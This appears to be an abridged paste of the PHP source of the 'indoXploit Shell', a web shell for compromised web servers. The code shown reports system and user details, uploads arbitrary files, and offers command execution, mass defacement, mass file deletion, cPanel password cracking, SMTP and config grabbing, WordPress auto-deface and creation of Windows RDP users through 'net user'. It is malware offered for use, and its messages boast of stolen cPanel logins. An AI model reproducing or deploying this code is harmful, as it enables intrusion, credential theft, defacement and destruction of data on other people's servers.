<html>
<head>
<title>indoXploit Shell</title>
<meta name='author' content='IndoXploit'>
<center><img src="https://fbcdn-photos-c-a.akamaihd.net/hphotos-ak-xfa1/v/t1.0-0/s480x480/14433024_1090199254350283_2575046815718118135_n.jpg?oh=e56b9db87cc3269c7a8eb157d5ab36ad&oe=585F5DBB&__gda__=1483005744_1cd405e7d61b4b385b79bcb2bc3a86c4"></center>
...
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=cyan>NONE</font>";
...
echo "System: <font color=cyan>".php_uname()."</font><br>";
echo "User: <font color=cyan>".$user."</font> (".$uid.") Group: <font color=cyan>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=cyan>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: <font color=cyan>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=cyan>$used</font> / <font color=cyan>$total</font> ( Free: <font color=cyan>$freespace</font> )<br>";
...
echo "<center>";
echo "<ul>";
echo "<li> <a href='?'><font color=#008080>{Home}</a></li>";
echo "<li> <a href='?dir=$dir&do=upload'><font color=#008080>{Upload}</a></li>";
echo "<li> <a href='?dir=$dir&do=cmd'><font color=#008080>{Command}</a></li>";
echo "<li> <a href='?dir=$dir&do=mass_deface'><font color=#008080>{Mass Deface}</a></li>";
echo "<li> <a href='?dir=$dir&do=mass_delete'><font color=#008080>{Mass Delete}</a></li>";
echo "<li> <a href='?dir=$dir&do=config'><font color=#008080>{Config}</a></li>";
echo "<li> <a href='?dir=$dir&do=jumping'><font color=#008080>{Jumping}</a></li>";
echo "<li> <a href='?dir=$dir&do=cpanel'><font color=#008080>{CPanel Crack}</a></li>";
echo "<li> <a href='?dir=$dir&do=smtp'><font color=#008080>{SMTP Grabber}</a></li>";
echo "<li> <a href='?dir=$dir&do=zoneh'><font color=#008080>{Zone-H}</a></li>";
echo "<li> <a href='?dir=$dir&do=cgi'><font color=#008080>{CGI Telnet}</a></li>";
echo "<li> <a href='?dir=$dir&do=network'><font color=#008080>{network}</a></li>";
echo "<li> <a href='?dir=$dir&do=adminer'><font color=#008080>{Adminer}</a></li><br>";
echo "<li> <a href='?dir=$dir&do=fake_root'><font color=#008080>{Fake Root}</a></li>";
echo "<li> <a href='?dir=$dir&do=auto_edit_user'><font color=#008080>{Auto Edit User}</a></li>";
echo "<li> <a href='?dir=$dir&do=auto_wp'><font color=#008080>{Auto Edit Title WordPress}</a></li>";
echo "<li> <a href='?dir=$dir&do=auto_dwp'><font color=#008080>{WordPress Auto Deface}</a></li>";
echo "<li> <a href='?dir=$dir&do=auto_dwp2'><font color=#008080>{WordPress Auto Deface V.2}</a></li>";
echo "<li> <a href='?dir=$dir&do=cpftp_auto'><font color=#008080>{CPanel/FTP Auto Deface}</a></li>";
echo "<li> <a href='?dir=$dir&do=krdp_shell'><font color=#008080>{K-RDP Shell}</a></li>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['do'] == 'upload') {
    ...
    if($_POST['upload']) {
        if($_POST['tipe_upload'] == 'biasa') {
            if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
                $act = "<font color=cyan>berhasil kaka!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
            } else {
    ...
    echo "<center><a href='?dir=$dir/idx_config'><font color=cyan>Done</font></a></center>";
        ...
        if($passwd == '' || !$etc) {
            ...
            foreach($user_jumping[1] as $user_idx_jump) {
                ...
                if(is_readable($user_jumping_dir)) {
                    $i++;
                    $jrw = "[<font color=cyan>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                    if(is_writable($user_jumping_dir)) {
                        $jrw = "[<font color=cyan>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                    }
                    echo $jrw;
    ...
    if($_POST['crack']) {
        ...
        if($i == 0) {
            ...
            echo "<br>sukses nyolong ".$i." Cpanel by <font color=cyan>IndoXploit.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
    ...
    if($_POST['crack']) {
        ...
        if($i == 0) {
            ...
            echo "<br>sukses deface ".$i." Cpanel by <font color=cyan>IndoXploit.</font>";
        }
    } else {
        echo "<center>
        <form method='post'>
    ...
    if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
        if($_POST['create']) {
            ...
            if($_POST['opsi'] == '1') {
                ...
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[change password: <font color=cyan>IndoXploit<</font>] -> ";
                    if($cek) {
                        echo "<font color=cyan>siap di pakai kaka</font>";
                    } else {
    ...
    echo "<center>Copyright © ".date("Y")." - <a href='http://www.indoxploit.or.id/' target='_blank'><font color=cyan>IndoXploit</font></a></center>";
}
?>
</html>
RAW Paste Data